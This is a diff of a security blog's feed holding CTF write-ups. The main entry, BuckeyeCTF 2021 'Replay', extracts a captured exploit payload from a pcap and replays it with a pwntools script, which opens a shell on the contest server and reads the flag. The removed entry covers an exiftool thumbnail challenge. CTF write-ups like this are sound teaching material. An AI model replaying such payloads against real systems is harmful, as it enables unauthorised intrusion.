+&lt;ul&gt;
+  &lt;li&gt;Let’s first connect to the app ourselves to see what the interaction looks like:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;┌──(shinris3n㉿kodachi)-[~/sec/CTFs/BuckeyeCTF2021/misc/replay]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nc misc.chall.pwnoh.io 13371
+&lt;span class=&quot;go&quot;&gt;HELLO HOW ARE YOU DOING TODAY
+Fantastic!
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;Analyzing the pcap that we are provided using Wireshark, we can follow the TCP stream to see what was being sent and received.  This can be done by clicking the entry and navigating the menu options to Follow -&amp;gt; TCP Stream:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/writeups/BuckeyeCTF2021/fda98c019234993fa2d0372ba431002a.png&quot; alt=&quot;fda98c019234993fa2d0372ba431002a.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/writeups/BuckeyeCTF2021/704d1f854245ddf00df5ba2ccecd17e6.png&quot; alt=&quot;704d1f854245ddf00df5ba2ccecd17e6.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Comparing this to what we saw when we first connected to the app, it looks like some shellcode was sent across to exploit the app successfully.  We can see the hex bytes for this shellcode by setting the “Show data as” field to “Raw”:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/writeups/BuckeyeCTF2021/aa6d3e14537b51c7ca8e5fe361b13256.png&quot; alt=&quot;aa6d3e14537b51c7ca8e5fe361b13256.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Now we’re able to write our own exploit script, using this as a payload.   Below is a Python3 implementation of such a script, leveraging the pwntools CTF toolkit to make catching and handling the command shell our payload spawns easier.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# BuckEyeCTF 2021 - Replay
+# shinris3n/NINPWN
+&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# pip3 install pwn
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Open up connection.
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'misc.chall.pwnoh.io'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;13371&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;tcpsocket&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Receive server input request
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcpsocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Define payload from wireshark capture
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x61\x61\x61\x61\x62\x61\x61\x61\x63\x61\x61\x61\x64\x61\x61\x61\x65\x61\x61\x61\x66\x61\x61\x61\x67\x61\x61\x61\x68\x61\x61\x61\x69\x61\x61\x61\x6a\x61\x61\x61\x6b\x61\x61\x61\x6c\x61\x61\x61\x6d\x61\x61\x61\x6e\x61\x61\x61\x6f\x61\x61\x61\x70\x61\x61\x61\x71\x61\x61\x61\x72\x61\x61\x61\x73\x61\x61\x61\x74\x61\x61\x61\x75\x61\x61\x61\x76\x61\x61\x61\x77\x61\x61\x61\x78\x61\x61\x61\x79\x61\x61\x61\x7a\x61\x61\x62\x62\x61\x61\x62\x63\x61\x61\x62\x64\x61\x61\x62\x65\x61\x61\x62\x66\x61\x61\x62\x67\x61\x61\x62\x68\x61\x61\x62\x69\x61\x61\x62\x55\x11\x40\x00\x00\x00\x00\x00\x0f\x00\x00\x00\x00\x00\x00\x00\x57\x11\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x20\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x57\x11\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x33\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0a&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Encode and send payload
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcpsocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Sent: 0x'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;binascii&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Catch the shell
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcpsocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;┌──(shinris3n㉿kodachi)-[~/sec/CTFs/BuckeyeCTF2021/misc/replay]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;python3 ./replay.py 
+&lt;span class=&quot;go&quot;&gt;[+] Opening connection to misc.chall.pwnoh.io on port 13371: Done
+b'HELLO HOW ARE YOU DOING TODAY\n'
+Sent: 0x6161616162616161636161616461616165616161666161616761616168616161696161616a6161616b6161616c6161616d6161616e6161616f616161706161617161616172616161736161617461616175616161766161617761616178616161796161617a616162626161626361616264616162656161626661616267616162686161626961616255114000000000000f0000000000000057114000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000042040000000000000000000000000000000000000000000000000000000000000000000000000003b000000000000000000000000000000000000000000000057114000000000000000000000000000330000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a
+[*] Switching to interactive mode
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;chall
+flag.txt
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
+&lt;span class=&quot;go&quot;&gt;buckeye{g00d_th1ng_P1E_w4s_d1s4bl3d_0n_th3_b1n4ry}
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;As an aside, pwntools has a neat debugging feature as well that can help if your shellcode isn’t quite working the way you want it to and you need some more information about what you’re actually sending across:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;┌──(shinris3n㉿kodachi)-[~/sec/CTFs/BuckeyeCTF2021/misc/replay]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;python3 ./replay.py DEBUG
+&lt;span class=&quot;go&quot;&gt;[+] Opening connection to misc.chall.pwnoh.io on port 13371: Done
+[DEBUG] Received 0x1e bytes:
+    b'HELLO HOW ARE YOU DOING TODAY\n'
+b'HELLO HOW ARE YOU DOING TODAY\n'
+[DEBUG] Sent 0x19a bytes:
+    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
+    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
+    00000020  69 61 61 61  6a 61 61 61  6b 61 61 61  6c 61 61 61  │iaaa│jaaa│kaaa│laaa│
+    00000030  6d 61 61 61  6e 61 61 61  6f 61 61 61  70 61 61 61  │maaa│naaa│oaaa│paaa│
+    00000040  71 61 61 61  72 61 61 61  73 61 61 61  74 61 61 61  │qaaa│raaa│saaa│taaa│
+    00000050  75 61 61 61  76 61 61 61  77 61 61 61  78 61 61 61  │uaaa│vaaa│waaa│xaaa│
+    00000060  79 61 61 61  7a 61 61 62  62 61 61 62  63 61 61 62  │yaaa│zaab│baab│caab│
+    00000070  64 61 61 62  65 61 61 62  66 61 61 62  67 61 61 62  │daab│eaab│faab│gaab│
+    00000080  68 61 61 62  69 61 61 62  55 11 40 00  00 00 00 00  │haab│iaab│U·@·│····│
+    00000090  0f 00 00 00  00 00 00 00  57 11 40 00  00 00 00 00  │····│····│W·@·│····│
+    000000a0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
+    *
+    00000100  00 00 00 00  00 00 00 00  04 20 40 00  00 00 00 00  │····│····│· @·│····│
+    00000110  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
+    *
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;    00000130  3b 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │;&lt;/span&gt;···│····│····│····│
+&lt;span class=&quot;go&quot;&gt;    00000140  00 00 00 00  00 00 00 00  57 11 40 00  00 00 00 00  │····│····│W·@·│····│
+    00000150  00 00 00 00  00 00 00 00  33 00 00 00  00 00 00 00  │····│····│3···│····│
+    00000160  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
+    *
+    00000190  00 00 00 00  00 00 00 00  0a 0a                     │····│····│··│
+    0000019a
+Sent: 0x6161616162616161636161616461616165616161666161616761616168616161696161616a6161616b6161616c6161616d6161616e6161616f616161706161617161616172616161736161617461616175616161766161617761616178616161796161617a616162626161626361616264616162656161626661616267616162686161626961616255114000000000000f0000000000000057114000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000042040000000000000000000000000000000000000000000000000000000000000000000000000003b000000000000000000000000000000000000000000000057114000000000000000000000000000330000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a
+[*] Switching to interactive mode
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
+&lt;span class=&quot;go&quot;&gt;[DEBUG] Sent 0xd bytes:
+    b'cat flag.txt\n'
+[DEBUG] Received 0x33 bytes:
+    b'buckeye{g00d_th1ng_P1E_w4s_d1s4bl3d_0n_th3_b1n4ry}\n'
+buckeye{g00d_th1ng_P1E_w4s_d1s4bl3d_0n_th3_b1n4ry}
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;[*] Interrupted
+[*] Closed connection to misc.chall.pwnoh.io port 13371
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;]" /><category term="BuckeyeCTF2021" /><category term="Wireshark" /><category term="pwntools" /><summary type="html">Challenge Text:</summary></entry><entry><title type="html">N1TP</title><link href="http://0.0.0.0:4000/writeups/2021/09/18/HacktivityCon2021-N1TP.html" rel="alternate" type="text/html" title="N1TP" /><published>2021-09-18T17:25:21-05:00</published><updated>2021-09-18T17:25:21-05:00</updated><id>http://0.0.0.0:4000/writeups/2021/09/18/HacktivityCon2021-N1TP</id><content type="html" xml:base="http://0.0.0.0:4000/writeups/2021/09/18/HacktivityCon2021-N1TP.html">&lt;h1&gt;&lt;/h1&gt;
 &lt;h3&gt;&lt;font color=&quot;FF3030&quot;&gt; Challenge Text: &lt;/font&gt;&lt;/h3&gt;
 
 &lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;Author: @JohnHammond#&lt;/span&gt;6971
@@ -1485,38 +1884,4 @@ Download the file below.
 APSLE INE AGIRO HAƩ BANA GARA SINE SLANP
 b&lt;span class=&quot;s1&quot;&gt;'flag{eabd9a04bdd1ea626f2cfbb0ea5c5feb}'&lt;/span&gt;
 b&lt;span class=&quot;s1&quot;&gt;'aposlogahsapsleSinea\xca\x83ebei\xe2\x88\xabedtuifKur'&lt;/span&gt;
-&lt;span class=&quot;sb&quot;&gt;```&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;</content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;]" /><category term="NahamConCTF2021" /><summary type="html">Challenge Text</summary></entry><entry><title type="html">Pollex</title><link href="http://0.0.0.0:4000/writeups/2021/03/14/NahamCon2021-Pollex.html" rel="alternate" type="text/html" title="Pollex" /><published>2021-03-14T23:08:00-05:00</published><updated>2021-03-14T23:08:00-05:00</updated><id>http://0.0.0.0:4000/writeups/2021/03/14/NahamCon2021-Pollex</id><content type="html" xml:base="http://0.0.0.0:4000/writeups/2021/03/14/NahamCon2021-Pollex.html">&lt;h1&gt;&lt;/h1&gt;
-&lt;h3&gt;&lt;font color=&quot;FF3030&quot;&gt;Challenge Text&lt;/font&gt;&lt;/h3&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Author: @JohnHammond#6971
-
-👍
-
-Download the file below.
-
-Some people seem to have trouble reading this, understandably so. Sorry. The flag ends in these characters: 8fe36bc00}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h1&gt;&lt;/h1&gt;
-&lt;h3&gt;&lt;font color=&quot;FF3030&quot;&gt;Solution&lt;/font&gt;&lt;/h3&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Opening the image file provided, nothing seems out of place.  However, if we look closely at the thumbnail theres a flag hidden there:&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/writeups/NahamConCTF2021/593b7c4d875d4da3b29be9e116e24d0e.png&quot; alt=&quot;593b7c4d875d4da3b29be9e116e24d0e.png&quot; /&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;Let’s not fall for John Hammond’s pro trolling attempts by using our biggest monitor and accessibility settings to try to see the image as it appears in our folder or taking screenshots and trying to zoom in via some image editor.  (Yes, I may have done this at first…)&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Instead, we can easily see the flag clearly using exiftool to extract the thumbnail image:&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;exittool &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Thumbnailimage&lt;/span&gt; pollex &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ./pollex_thumbnail&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/writeups/NahamConCTF2021/c66d60c7816a44508a440b49dde15d7f.png&quot; alt=&quot;c66d60c7816a44508a440b49dde15d7f.png&quot; /&gt;&lt;/p&gt;</content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;]" /><category term="NahamConCTF2021" /><summary type="html">Challenge Text</summary></entry><entry><title type="html">Audio Support</title><link href="http://0.0.0.0:4000/resources/2020/12/15/audio-support.html" rel="alternate" type="text/html" title="Audio Support" /><published>2020-12-15T22:00:01-06:00</published><updated>2020-12-15T22:00:01-06:00</updated><id>http://0.0.0.0:4000/resources/2020/12/15/audio-support</id><content type="html" xml:base="http://0.0.0.0:4000/resources/2020/12/15/audio-support.html">&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=X0WNQ3UYbJE&quot; target=&quot;_blank&quot;&gt;All The Things&lt;/a&gt;
-&lt;br /&gt;
-&lt;a href=&quot;https://www.youtube.com/watch?v=08vrKZcA6eE&quot; target=&quot;_blank&quot;&gt;P5 OST&lt;/a&gt;&lt;/p&gt;</content><author><name>shinris3n</name></author><category term="[&quot;resources&quot;]" /><category term="resources" /><category term="everything" /><summary type="html">All The Things P5 OST</summary></entry></feed>
+&lt;span class=&quot;sb&quot;&gt;```&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;</content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;]" /><category term="NahamConCTF2021" /><summary type="html">Challenge Text</summary></entry></feed>
